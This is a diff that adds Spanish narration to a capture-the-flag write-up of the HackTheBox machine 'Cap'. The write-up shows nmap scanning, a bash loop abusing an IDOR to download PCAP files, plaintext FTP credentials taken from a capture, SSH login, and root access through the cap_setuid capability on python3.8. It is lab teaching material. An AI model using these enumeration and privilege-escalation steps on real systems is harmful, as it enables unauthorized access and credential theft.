@@ -21,9 +21,9 @@ layout:
 
 ***
 
+## Reconnaissance
 
-
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Cap**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.245 -oG allPorts
@@ -49,9 +49,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.78 seconds
            Raw packets sent: 65804 (2.895MB) | Rcvd: 65819 (2.633MB)
 ```
 
-
-
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -64,11 +62,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.78 seconds
 [*] Ports copied to clipboard
 ```
 
-
-
-
-
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abiertos el servicio SSH, FTP y una página web.
 
 ```bash
 ❯ nmap -sCV -p21,22,80 10.10.10.245 -A -oN targeted -oX targetedXML
@@ -103,9 +97,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 13.94 seconds
 ```
 
-
-
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -114,11 +106,13 @@ Nmap done: 1 IP address (1 host up) scanned in 13.94 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/4134_vmware_uq9TPTUlOo.png" alt=""><figcaption></figcaption></figure>
 
+## FTP Enumeration
 
+Trataremos de acceder al `FTP` con el usuario **anonymous**, nos encontramos que no podemos acceder anónimamente al FTP.
 
 ```bash
 ❯ ftp 10.10.10.245
@@ -131,39 +125,51 @@ Password:
 ftp: Login failed
 ```
 
+## Initial Access
 
+### Information Leakage
+
+Accediendo a [http://10.10.10.245](http://10.10.10.245) nos encontramos con la siguiente página web que nos muestra diferentes opciones y apartados.
 
 <figure><img src="../../.gitbook/assets/imagen (268).png" alt=""><figcaption></figcaption></figure>
 
-
+Accediendo a la opción de `Network Status`podemos comprobar un resumen sobre los puertos que están expuestos en el equipo. No logramos visualizar nada interesante.
 
 <figure><img src="../../.gitbook/assets/imagen (269).png" alt=""><figcaption></figcaption></figure>
 
-
+Accediendo al apartado de `IP Config` nos encontramos las interfaces de red que están habilitadas en el equipo.
 
 <figure><img src="../../.gitbook/assets/imagen (270).png" alt=""><figcaption></figcaption></figure>
 
-
+Si accedemos al apartado de `Security Snapshot (5 second PCAP + Analysis)` en el cual nos descarga, lo que parece ser una snapshot de seguridad en un archivo `.PCAP`.
 
 <figure><img src="../../.gitbook/assets/4138_vmware_Nq9zMQJiwy.png" alt=""><figcaption></figcaption></figure>
 
-
+Al analizar el archivo, no encontramos nada relevante en él.
 
 <figure><img src="../../.gitbook/assets/imagen (271).png" alt=""><figcaption></figcaption></figure>
 
-5 segundos
+### Insecure Directory Object Reference (IDOR)
 
-<figure><img src="../../.gitbook/assets/imagen (272).png" alt=""><figcaption></figcaption></figure>
+esperando nuevamente 5 segundos y accediendo a la opción, verificamos que nos carga una nueva entrada diferente a la anterior, lo cual nos parece algo extraño.
 
+<figure><img src="../../.gitbook/assets/imagen (272).png" alt="" width="545"><figcaption></figcaption></figure>
 
+Interceptaremos la solicitud a la hora de descargar el archivo para verificar cómo se tramita la solicitud por parte del servidor.
 
 <figure><img src="../../.gitbook/assets/imagen (273).png" alt=""><figcaption></figcaption></figure>
 
+Verificamos que hace una petición por `GET` a `/download/2` donde 2 es el nombre que nos aparecía en la URL antes de descargar el archivo. Por lo tanto, lo que podemos pensar es en lo siguiente.
 
+Insecure Direct Object Reference (IDOR), o **Referencia Directa a Objetos Inseguros**, es una vulnerabilidad que ocurre cuando una aplicación permite el acceso directo a un recurso (como archivos, objetos, o registros en una base de datos) sin validar correctamente si el usuario tiene los permisos necesarios para acceder a dicho recurso.
+
+#### ¿Cómo funciona?
+
+En un ataque IDOR, el atacante modifica un identificador (como un ID numérico, nombre de archivo o clave en una URL o solicitud HTTP) para acceder a recursos que no le pertenecen. Si la aplicación no valida los permisos de acceso, el atacante puede obtener o modificar información confidencial.
 
 <figure><img src="../../.gitbook/assets/imagen (274).png" alt=""><figcaption></figcaption></figure>
 
-
+Crearemos un script sencillo en `Bash` que se encargue de realizar una descarga a http://10.10.10.245/download/$i en donde el valor `$i` será remplazado por el bucle para probar del 0 al 100.
 
 ```bash
 #!/bin/bash
@@ -182,7 +188,7 @@ for i in {0..100}; do
 done
 ```
 
-
+Le darmeos permisos de ejecución al script y al ejecutarlo, verificamos que hemos logrado obtener diferentes archivos `.PCAP` simplemente modificando el valor del ID del archivo, por lo tanto, hemos podido abusar de la vulnerabilidad de `IDOR`.
 
 ```bash
 ❯ chmod +x exploit.sh
@@ -197,15 +203,19 @@ done
 .rw-rw-r-- kali kali 488 B  Sun Jan 26 13:39:58 2025  4.pcap
 ```
 
+### Analyzing PCAP file found leaked password
 
+Analizaremos todos los archivos `PCAP` encontrados. Al revisar el archivo `0.pcap` nos encontramos que existen solicitud que se realizaron al protocolo `FTP`.
 
-
+Seleccionando la petición indicada, le daremos a `Seguir < TCP Stream` para verificar más sobre la solicitud.
 
 <figure><img src="../../.gitbook/assets/imagen (275).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (276).png" alt=""><figcaption></figcaption></figure>
+Comnprobamos que nos aparecen las credenciales en texto plano del usuario `nathan`.
 
+<figure><img src="../../.gitbook/assets/imagen (276).png" alt="" width="379"><figcaption></figcaption></figure>
 
+Probaremos de conectarnos mediante SSH con las credenciales encontradas. Logramos obtener el acceso y verificar la flag de **user.txt**.
 
 ```bash
 ❯ ssh nathan@10.10.10.245
@@ -219,9 +229,11 @@ nathan@cap:~$ cat user.txt
 f58f8216595***********************
 ```
 
+## Privilege Escalation
 
+### Abusing Capabilities (Python3.8)
 
-
+Revisando los permisos del usuario `nathan`, nos encontramos que este usuario tenía asignado una `capabilitie` de `python3.8`. La cual podríamos intentar aprovechar para escalar privilegios al usuario `root`.
 
 ```bash
 nathan@cap:~$ getcap -r / 2>/dev/null
@@ -236,9 +248,7 @@ nathan@cap:~$ which python3.8 | xargs getcap
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 ```
 
-
-
-
+Accedemos al binario de Python y probamos de cambiarnos de `UID` y de acceder a una consola por `bash` como usuario `root`. Logramos obtener una terminal como usuario `root` y visualizar la flag de **root.txt**.
 
 ```bash
 nathan@cap:~$ python3.8
@@ -252,5 +262,5 @@ root
 0
 >>> os.system("/bin/bash")
 root@cap:~# cat /root/root.txt
-d6f9670f22792e4ad2979e67595cb414
+d6f9670*************************
 ```
